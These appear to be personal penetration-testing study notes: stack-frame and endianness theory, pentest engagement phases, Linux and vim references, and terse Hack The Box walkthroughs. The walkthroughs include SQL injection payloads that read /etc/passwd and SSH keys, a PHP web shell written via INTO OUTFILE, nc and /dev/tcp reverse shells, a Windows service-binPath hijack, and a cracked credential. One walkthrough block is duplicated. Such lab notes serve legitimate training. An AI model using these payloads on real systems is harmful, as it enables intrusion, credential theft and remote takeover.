		Main Stack Frame ESP ->	Old EBP (main)  <- EBP
					old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The first instruction in the epilogue is mov esp, ebp. After it gets executed; both ESP and EBP point to the same location.
 + The next instruction is pop ebp, which simply POPS the value from the top of the stack into EBP. Since the top of the Stack points to the memory address location where the old EBP is stored (the EBP of the caller), the caller stack frame is restored.
 + It is important to know that a POP operation automatically updates the ESP (same as the PUSH).
 + Therefore, ESP now points to the old EIP previously stored
					...
					Old EBP (main)  
		Main Stack Frame	old EIP		<- ESP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP 	<- EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The last instruction that the epilogue will execute is ret. RET pops the value contained at the top of the stack to the old EIP - the next instruction after the caller and jumps to that location. This gives control back to the caller. RET affects only the EIP and the ESP registers.

1.2.5 Endianness
 + Endianness is the way of representing (storing) values in memory.
 + Even though there are three types of endianness, we will explain only two of them, the most important ones: big-endian and little-endian.
 > First, it is important to know these two concepts:
 	· The most significant bit (MSB) in a binary number is the largest value, usually the first from the left. So, for example, considering the binary number 100 the MSB is 1.
	· The least significant bit (LSB) in a binary number is the lowest value, usually the first from the right. So, for example, considering the binary number 110 the LSB is 0.
 + In the big-endian representation, the least significant byte (LSB) is stored at the highest memory address. While the most significant byte (MSB) is at the lowest memory address.
 	· Example: the 0x12345678 value is represented as:
		Highest memory	Address in memory	Byte value
				+0			0x12
				+1			0x34
				+2			0x56
		Lowest memory	+3			0x78
 + Respectively, in the little-endian representation, the least significant byte (LSB) is stored at the lower memory address, while the most significant byte is at the highest memory address. 
 	· Example: the 0x12345678 is represented in memory as:
		Highest memory	Address in memory	Byte value
				+0			0x78
				+1			0x56
				+2			0x34
		Lowest memory	+3			0x12
 + Here's another example. Let us consider the value 11 (0B in hexadecimal). The example system is using little-endian representation; therefore, the LSB is stored in the lower memory address or MSB is stored at the highest memory address.
 + Using the previous table, we will have the following
		Highest memory	Address in memory	Byte value
				+0			0x0B
				+1			0x00
				+2			0x00
		Lowest memory	+3			0x00
 + Remember that the most significant byte is stored at the highest memory address and since the stack grows backward (towards lower addresses), the most significant byte (0B in this case) will be stored on the "left" (0028FEBF - the highest memory address)

1.2.6 NOPs
+ Another important topic is the No Operation instruction (NOP)
+ NOP is an assembly language instruction that does nothing. When the program encounters a NOP, it will simply skip to the next instruction. In Intel x86 CPUs, NOP instructions are represented with the hexadecimal value 0x90
+ NOP-sled is a technique used during the exploitation process of Buffer Overflows. Its only purpose is to fill a large (or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
+ The reason is because Buffer Overflows have to match a specific size and location that the program is expecting.



Continue...
-=-=-=
Meanwhile (HTB academy fundamentals modules)
Penetration testing phases (Introduction)
1. Pre-Engagement
	Types of Testing environments
		Network 	Web App 	Mobile 	API 	Thick Clients
		IoT 	Cloud 	Source Code 	Physical Security 	Employees
		Hosts 	Server 	Security Policies 	Firewalls 	IDS/IPS
	
	Document							Timing for Creation
	1. Non-Disclosure Agreement (NDA)				After Initial Contact
	2. Scoping Questionnaire					Before the Pre-Engagement Meeting
	3. Scoping Document						During the Pre-Engagement Meeting
	4. Penetration Testing Proposal (Contract/Scope of Work (SoW))	During the Pre-engagement Meeting
	5. Rules of Engagement (RoE)					Before the Kick-Off Meeting
	6. Contractors Agreement (Physical Assessments)			Before the Kick-Off Meeting
	7. Reports							During and after the conducted Penetration Test
	
	
	Aside from the assessment type, client name, address, and key personnel contact information, some other critical pieces of information include:
		
	How many expected live hosts? 	
	How many IPs/CIDR ranges in scope? 	
	How many Domains/Subdomains are in scope? 	
	How many wireless SSIDs in scope? 	
	How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? 	
	For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? 	
	If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? 	
	What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? 	
	Is a separate Active Directory Security Assessment desired? 	
	Will network testing be conducted from an anonymous user on the network or a standard domain user? 	
	Do we need to bypass Network Access Control (NAC)?

2. Information gathering
2.1 Categories	
    Open-Source Intelligence
    Infrastructure Enumeration: This includes name servers, mail servers, web servers, cloud instances, and more. We make an accurate list of hosts and their IP addresses and compare them to our scope to see if they are included and listed.
    Service Enumeration
    Host Enumeration
2.2 Interesting websites 
	https://searchcode.com/

3. Vulnerability assessment
3.1. Different sources
	https://www.cvedetails.com/
	https://packetstormsecurity.com/
	https://www.exploit-db.com/
	https://nvd.nist.gov/vuln/search?execution=e2s1
	https://www.securityfocus.com/vulnerabilities
	https://vulners.com/
	https://www.rapid7.com/db/
	https://www.vulnerability-lab.com/

4. Exploitation
	https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
5. Post-Exploitation
	Pillaging is the stage where we examine the role of the host in the corporate network. We analyze the network configurations, including but not limited to:
		Interfaces 	Routing 	DNS
		ARP 	Services 	VPN
		IP Subnets 	Shares 	Network Traffic

	Companies must adhere to data security regulations depending on the type of data involved. These include, but are not limited to:
		Type of Information 	Security Regulation
		Credit Card Account Information 	Payment Card Industry (PCI)
		Electronic Patient Health Information 	Health Insurance Portability and Accountability Act (HIPAA)
		Consumers Private Banking Information 	Gramm-Leach-Bliley (GLBA)
		Government Information 	Federal Information Security Management Act of 2002 (FISMA)
		
	Some frameworks companies may follow include:
			
		(NIST) - National Institute of Standards and Technology 	(CIS Controls) - Center for Internet Security Controls
		(ISO) - International Organization for Standardization 	(PCI-DSS) - The Payment Card Industry Data Security Standard
		(GDPR) - General Data Protection Regulation 	(COBIT) - Control Objectives for Information and Related Technologies
		(FedRAMP) - The Federal Risk and Authorization Management Program 	(ITAR) - International Traffic in Arms Regulations
		(AICPA) - American Institute of Certified Public Accountants 	(NERC CIP Standards) - NERC Critical Infrastructure Protection Standards
-=-=-=-




    

Academy_HTB
Linux fundamentals(https://www.pathname.com/fhs/pub/fhs-2.3.pdf)
| *Command* | *Description* |
| --------------|-------------------|
| `man <tool>` | Opens man pages for the specified tool. | 
| `<tool> -h` | Prints the help page of the tool. | 
| `apropos <keyword>` | Searches through man pages' descriptions for instances of a given keyword. | 
| `cat` | Concatenate and print files. |
| `whoami` | Displays current username. | 
| `id` | Returns users identity. | 
    The adm group means that the user can read log files in /var/log
| `hostname` | Sets or prints the name of the current host system. | 
| `uname` | Prints operating system name. | 
    uname -p //Processor type
    uname -i //Hardware plaftorm
| `pwd` | Returns working directory name. | 
| `ifconfig` | The `ifconfig` utility is used to assign or view an address to a network interface and/or configure network interface parameters. | 
| `ip` | Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. | 
| `netstat` | Shows network status. | 
| `ss` | Another utility to investigate sockets. | 
  ss -l -4 | grep -E "LISTEN" | grep -vE "127.0.0.*" |wc -l
| `ps` | Shows process status. | 
| `who` | Displays who is logged in. | 
| `env` | Prints environment or sets and executes a command. | 
| `lsblk` | Lists block devices. | 
| `lsusb` | Lists USB devices. | 
| `lsof` | Lists opened files. | 
| `lspci` | Lists PCI devices. | 
| `sudo` | Execute command as a different user. | 
| `su` | The `su` utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed. | 
| `useradd` | Creates a new user or update default new user information. | 
| `userdel` | Deletes a user account and related files. |
| `usermod` | Modifies a user account. | 
| `addgroup` | Adds a group to the system. | 
| `delgroup` | Removes a group from the system. | 
| `passwd` | Changes user password. |
| `dpkg` | Install, remove and configure Debian-based packages. | 
    dpkg -i strace_4.21-1ubuntu1_amd64.deb
    dpkg -i | grep -c "^ii" //List total packages installed on the target system
| `apt` | High-level package management command-line utility. | 
    A package is an archive file containing multiple ".deb" files.
    cat /etc/apt/sources.list
    APT uses a database called the APT cache. This is used to provide information about packages installed on our system offline.
        apt-cache search impacket
        apt-cache show impacket-scripts
        apt list --installed
| `aptitude` | Alternative to `apt`. | 
| `snap` | Install, remove and configure snap packages. |
| `gem` | Standard package manager for Ruby. | 
| `pip` | Standard package manager for Python. | 
| `git` | Revision control system command-line utility. | 
| `systemctl` | Command-line based service and systemd control manager. |
    Most Linux distributions have now switched to systemd. This daemon is an Init process started first and thus has the process ID (PID) 1. This daemon monitors and takes care of the orderly starting and stopping of other services. All processes have an assigned PID that can be viewed under /proc/ with the corresponding number. Such a process can have a parent process ID (PPID), known as the child process.
    Besides systemctl we can also use update-rc.d to manage SysV init script links. Let us have a look at some examples
        systemctl enable ssh
    systemctl list-units --type=service //list all services
| `ps` | Prints a snapshot of the current processes. | 
| `journalctl` | Query the systemd journal. | 
    journalctl -u ssh.service --no-pager //View logs 
| `kill` | 
    kill -l //
        The most commonly used are:
        Signal	Description
    1	SIGHUP - This is sent to a process when the terminal that controls it is closed.
    2	SIGINT - Sent when a user presses [Ctrl] + C in the controlling terminal to interrupt a process.
    3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit.
    9	SIGKILL - Immediately kill a process with no clean-up operations.
    15	SIGTERM - Program termination.
    19	SIGSTOP - Stop the program. It cannot be handled anymore.
    20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend and they will not be executed further. To keep it running in the background, we have to enter the command bg to put the process in the background.

| `jobs` | Lists all processes that are running in the background. | 
| `fg` | Puts a process into the foreground. | 
| `bg` | Suspends the process but it keep it running in the background
| `curl` | Command-line utility to transfer data from or to a server. | 
| `wget` | An alternative to `curl` that downloads files from FTP or HTTP(s) server. |
| `python3 -m http.server` | Starts a Python3 web server on TCP port 8000. | 
| `ls` | Lists directory contents. | 
| `cd` | Changes the directory. |
| `clear` | Clears the terminal. | 
| `touch` | Creates an empty file. |
| `mkdir` | Creates a directory. | 
  mkidr -p Storage/local/user/documents //Add parent directories
| `tree` | Lists the contents of a directory recursively. |
| `mv` | Move or rename files or directories. | 
| `cp` | Copy files or directories. |
| `nano` | Terminal based text editor. | 
| `which` | Returns the path to a file or link. |
| `find` | Searches for files in a directory hierarchy. | 
  find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null
  find / -type f -name *.conf -newermt 2020-03-03 -size +25k -size -28k -exec ls -al {} \; 2>/dev/null
  find /etc/ -name shadow 2> stderr.txt 1> stdout.txt //Redirect STDOUT and STDERR to separate files
| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |
| `less` | An alternative to `more` with more features. Unlike more, when be closed the output does not remain in the terminal | 
| `head` | Prints the first ten lines of STDOUT or a file. |
| `tail` | Prints the last ten lines of STDOUT or a file. | 
| `sort` | Sorts the contents of STDOUT or a file. |
| `grep` | Searches for specific results that contain given patterns. | 
| `cut` | Removes sections from each line of files. |
| `tr` | Replaces certain characters. | 
| `column` | Command-line based utility that formats its input into multiple columns. |
  cat /etc/passwd | grep -Ev "nologin|false" | tr ":" " " | column -t
| `awk` | Pattern scanning and processing language. |
  cat /etc/passwd | grep -Ev "nologin|false" | tr ":" " "  | awk '{print $1, $NF}'
| `sed` | A stream editor for filtering and transforming text. | 
| `wc` | Prints newline, word, and byte counts for a given input. |
| `chmod` | Changes permission of a file or directory. |
| `chown` | Changes the owner and group of a file or directory. |
  chown root:root shell && ls -l shell

Path	Description
/	    The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
/bin	Contains essential command binaries.
/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
/dev	Contains device files to facilitate access to every hardware device attached to the system.
/etc	Local system configuration files. Configuration files for installed applications may be saved here as well.
/home	Each user on the system has a subdirectory here for storage.
/lib	Shared library files that are required for system boot.
/media	External removable media devices such as USB drives are mounted here.
/mnt	Temporary mount point for regular filesystems.
/opt	Optional files such as third-party tools can be saved here.
/root	The home directory for the root user.
/sbin	This directory contains executables used for system administration (binary system files).
/tmp	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
/usr	Contains executables, libraries, man files, etc.
/var	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.

Working with Web Services
 For an Apache web server, we can use appropriate modules, which can encrypt the communication between browser and web server (mod_ssl), use as a proxy server (mod_proxy), or perform complex manipulations of HTTP header data (mod_headers) and URLs (mod_rewrite).

Navigation
  cd - //Jump back to the directory we were last in

Redirect STDIN Stream to a File
  We can also use the double lower-than characters (<<) to add our standard input through a stream. We can use the so-called End-Of-File (EOF) function of a Linux system file, which defines the input's end
  cat << EOF > stream.txt

An option for further locking down Linux systems is Security-Enhanced Linux (SELinux) or AppArmor. This is a kernel security module that can be used for security access control policies. In SELinux, every process, file, directory, and system object is given a label. Policy rules are created to control access between these labeled processes and objects and are enforced by the kernel. This means that access can be set up to control which users and applications can access which resources. SELinux provides very granular access controls, such as specifying who can append to a file or move it. Besides, there are different applications and services such as Snort, chkrootkit, rkhunter, Lynis, and others that can contribute to Linux's security.

Private browser setup
  firejail --private --dns=1.1.1.1 --dns=9.9.9.9 firefox -no-remote
  └──╼ $firejail --private=/home/m1l0js/work firefox --dns=1.1.1.1 --dns=9.9.9.9 -no-remote &

  a

Useful links
https://bashrcgenerator.com/
https://github.com/powerline/powerline
https://explainshell.com/


      



          
      


-=-=-
Portswigger
1.SQLi
show databases;
create database Twitch;
MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';



-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=

JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>

#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in       
        
            
        




          
        



      
      
          
      
      



          
      


-=-=-
Portswigger
1.SQLi
show databases;
create database Twitch;
MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';



-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=

JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>

#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 

database(), version() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name

-=-=-=-=-=-=-=-=
Validation machine ==> 
<h1>Hola</h1> (HTML injection vulnerable) //<script>alert("XSS")</script> (XSS vulnerable) ==> Let's how one of the parameters are send with burpsuite ==> burpsuite &> /dev/null & ==> SQLi ==> In the POST request username=suspicious&country=Brazil' union select version()-- - ==> username=suspicious&country=Brazil' union select "test"-- - //Test appears on the screen ==> username=suspicious&country=Brazil' union select schema_name from information_schema.schemata-- - ==> username=suspicious&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- - ==>
username=suspicious&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- - ==> username=suspicious&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- - //It does not work, let's try with into outfile ==> username=suspicious&country=Brazil' union select "loquesea" into outfile "/var/www/html/dog.txt"-- - ==>
username=baduser&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/test.php"-- -
//validation.py 
  pdb.set_trace()
    l
    p filename
    p main_url
//Another SQLi ==> static php cookie ==> ❯ echo -n 'm1l0js' | md5sum f49775f4b37981eb269a05abccba27cf ==> Use it in storage(developer tools)
//Use burpsuite in cmd parameter and urlencode the data

-=-=-=-=-=-
Return machine ==> 10.129.95.241
Open targetedXML with xsltproc ==> ❯ sudo xsltproc targetedXML > /var/www/html/index.html && service apache2 start ==> Perfect for Reports (LaTex) and so on.
whatweb http://10.129.95.241 -v ==> In http://10.129.95.241/settings.php change server address to your IP ==> 
Does this user belongs to the remote management users? 
Ways to privesc ==> net user svc-printer ==> Search in Google "Server operators microsoft" ==> Start and stop services ==> 
sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.37 443" //Send us a reverse shell 
PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.37 443"
sc.exe stop VMTools
(nc -nvlp 443)
sc.exe start VMTools

-=-=-=-=-=-=
Tentacle machine ==> 10.129.3.71
nvim /etc/hosts ==> 10.129.3.71 realcorp.htb srv01.realcorp.htb
dig @10.129.3.71 realcorp.htb
;; AUTHORITY SECTION:
realcorp.htb.           86400   IN      SOA     realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400

dig @10.129.3.71 realcorp.htb ns
;; ADDITIONAL SECTION:
ns.realcorp.htb.        259200  IN      A       10.197.243.77

vim /etc/proxychains.conf ==> http 10.129.3.71 3128
❯ dnsenum --dnsserver 10.129.3.71 --threads 20 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
Authentication in SSH with kerberos
apt install krb5-user OR dpkg-reconfigure krb5-config
knit j.nakasawa
klist 
kdestroy
.k5login
Privesc with pkexec 
	https://github.com/berdav/CVE-2021-4034














----------------------------------------------------------=================-----------------------
find
	-type d(only find directories) || f(find files)
	-name || -iname: Case insensitive
	-user: The username of the owner of a file
	-size: -n/+n/n can be used, where n is a number. To specify a size, you also need a sufix. c=bytes, k=KB and M=MBs. Example: If you want to specify a size less than 30 bytes, the argument -30c should be used
	-perm: To specify permissions.
		You can use - prefix to return files with at least the permissions you specify. This means that the -444 mode will match files that are readable by everyone, even if someone also has write and/or execute permissions.
		Using the / prefix will return files that match any of the permissions you have set. This means that the /666 mode will match files that are readable and writeable by at least one of the groups(owner,group or others)
	-a,m,c with min(for minutes) and time(days).
		-a:accesed
		-m:modified
		-c:changed
		Example:
		A file accesed more than 30 minutes ago: -amin +30
		Modified less than 7 days ago: -mtime -7
		A file modified within the last 24 hours: -mtime 0
	-exec: Example: -exec whoami \;

vim:
  :set shell=/bin/bash
  :shell


wget: Allows us to download files from the web via HTTP--as if you were accessing the file in your browser
SCP: Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption
	To copy an example file from our machine to a remote machine	scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
	To copy a file from a remote computer that we are not logged into:	scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
python3 -m http.server: One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use.
	And alternative is updog(pip3 install updog)
Viewing processes:
	ps aux: To see the processes run by other users and those that don't run from a session(i.e. system processes)
	top
	kill: Below are some of the signals that we can send to a process when it is killed
		SIGTERM: Kill the process, but allow it to do some cleanup tasks beforehand
		SIGKILL: Kill the process - doesn't do any cleanup after the fact
		SIGSTOP: Stop/suspend a process
	Once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what's known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process(although sharing the resources from systemd) to make it easier for us to identify and the likes.
	We can do four options with systemctl(This command allows us to interact with the systemd process/daemon)
		Start
		Stop
		Enable
		Disable
	When excuting things like scripts --rather than relying on the & operator, we can use ctrl + z on our keyboard to background a process.
	fg: To bring the background process back into use on the terminal, where the output of the script is now returned to use

crontabs: One of the processes that is started during boot, which is responsible for facilitating and managing cron jobs. It is simply a special file with formatting that is recognised by the cron. It requires 6 specific values:
	MIN: What minute to execute at
	HOUR: What hour to execute at
	DOM: What day of the month to execute at
	MON: What month of the year to execute at
	DOW: What day of the week to execute at
	CMD: The actual command that will be executed

	Example: 0 *12 * * * cp -R /home/andres/Documents /var/backups/
	crontab -e: Crontabs can be edited

package management:
	add-apt-repository. Whilst you can install software through the use of package installers such as dpkg. The benefits os apt means that whenever we update our system, the repository that contains the pieces of software that we add also gets checked for updates
	When adding software, the integrity of what we download is guaranteed by the use of what is called GPG(Gnu Privacy Guard) keys.
	Example:
		wget -qo - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
		A good practice is to have a separate file for every different community/3rd party repository that we add
			in /etc/apt/sources.list.d touch sublime-text.list
			nano sublime-text.list
			deb https://download.sublimetext.com/ apt/stable/
		apt update: After that, we need to update apt to recognise this new entry
		apt install sublime-text
		add-apt-repository --remove  and after apt remove sublime-text: To remove packages
Vim

	i: Insert at the beginning of the line
	A: Append to the final
        daw : delete the word under the cursor    
        caw : delete the word under the cursor and put you in insert mode
	dw: Until the start of the next word, EXCLUDING its first character
	de: To the end of the current word, INCLUDING the last character
	d$: Delete to the end of the line, INCLUDING the last character
	2w: Move the cursor two word forward
	3e: Move the cursor to the end of the third word forward
	0:  Move to the start of the line
	d2w: To delete the consecutive words
	dd: Delete a line
	2dd: Delete two lines
	u: Undo the last commands
	U: To fix a whole line
	r: To replace the character
	ce: To change until the end of a word
	c$: To change the rest of the line
	Ctrl G: Displays your location in the file
	G: To move you to the bottom of the file
	gg: To move you to the start of the file
	5G: To move to the line 5
	/: To search
		n: To search for the same prase again
		N: In the opposite direction
	?: To search for a phrase in the backward direction
		Ctrl o: To go back further
		Ctrl i: Goes forward
	%: Move the cursor to the other (,{ or {
	:s/old/new/g:To substitute 'new' for 'old'
		:#,#s/old/new/g: Where # are the line numbers of the range of lines where the substitution is to be done.
		:%s/old/new/gc: To find every occurrence in the whole file, with a prompt whether to substitute or not
	:!ls: Execute an external command
	:w TEST: Where TEST is the filename you chose
	:!del or rm: To remove
	v: Visual mode
	:r TEST: To retrieve the file and puts it below the cursor
	o: Open up a line BELOW the cursor and place you in Insert mode
	O: El contrario
	a: To append text AFTER the cursor
	a,i and A all go to the same Insert mode, the only difference is where
	R: To replace more than one character
	y: Copy text
	p: Paste it
	:set xxx: Where
		ic: ignorecase >> Ignore upper/lower case when searching
		is: incsearch >> Show partial matches for a search phrase
		hls: hlsearch >> Highlith all matching phrases
	Prepend no to switch an option off: :set noic

Regular expressions:
	[abc]: a,b,c (every occurrence of each letter)
	[abc]zz will match azz, bzz and czz. You can also use a - to define ranges:
		[a-c]zz is the same as above
	[a-cx-z]zz will match azz,bzz,czz,xzz,yzz and zzz
	[a-zA-Z] will match any single letter(lowercase or uppercase)
	file[1-3] will match file1,file2 and file3
	[^k]ing will match ring,sing,$ing but not king
	[^a-c]at will match fat and hat, but not bat or cat
	. is the wildcard that is used to match any single character(except the line break)
		a.c will match aac,abc,a0c,a!c and so on.
		a\.c: If you want to search for a literal dot
	? character optional.
		abc? will match ab and abc sinc de c is optional
	\d matches a digit, like 9
	\D matches a non-digit, like A or @
	\w matches an alphanumeric character, like a or 3. _ are included here.
	\W matches a non-alphanumeric character, like ! or #.
	\s matches a whitespace character (spaces, tabs, and line breaks)
	\S matches everything else (alphanumeric characters and symbols)
	{12} - exactly 12 times.
	{1,5} - 1 to 5 times.
	{2,} - 2 or more times.
	* - 0 or more times.
	+ - 1 or more times.

Bash scripting
https://tldp.org/LDP/abs/html/ #Advanced bash scripting
	#!/bin/bash
	set -x and set +x to debug code
	unset transport[1]: to remove an element in an array

#Example
if [ x ]; then
  docommand
elif [ y ]; then
  doothercommand
else
  dosomethingelse
fi

#Other
#!/bin/bash
for i in $( ls ); do
  echo item: $i
done

#Other with seq
#!/bin/bash
for i in `seq 1 10`;
do 
  echo $i
done

#While loop
while [condition]; do <command1>;<command2>;done

#Read line
while read line; do echo $line; done < file.txt


	-eq: Checks if the value of two operands are equal or not; if yes, then the condition becomes true.
	-ne: Checks if the value of two operands are equal or not; if values are not equal, then the condition becomes true.
	-gt: Checks if the value of left operand is greater than the value of right operand; if yes, then the condition becomes true.
	-lt: Checks if the value of left operand is less than the value of right operand; if yes, then the condition becomes true.
	-ge: Checks if the value of left operand is greater than or equal to the value of right operand; if yes, then the condition becomes true.
	-f: Checks if the file exists
	-w: Checks if the file is writable. Without write permissions we would not be able to output our text into the file
	read: To insert text

        curl -G: To change request methot to GET
        curl --proxy http://localhost:8080 : To use Burp
        cp /bin/bash /dev/shm/ajgs
          /dev/shm/ajgs -c '/dev/shm/ajgs -i >& /dev/tcp/10.10.14.47/4126 0>&1'


DNS:
nslookup --type=CNAME shop.website.thm
	Different types: A, AAAA, CNAME, MX and TXT among others.

Windows:
    C:\Windows\system32\cmd.exe
    path ==> Like in linux by separated through the ','
      First => built-in commands
      Second => PATH
    To list windows variables use 'set'
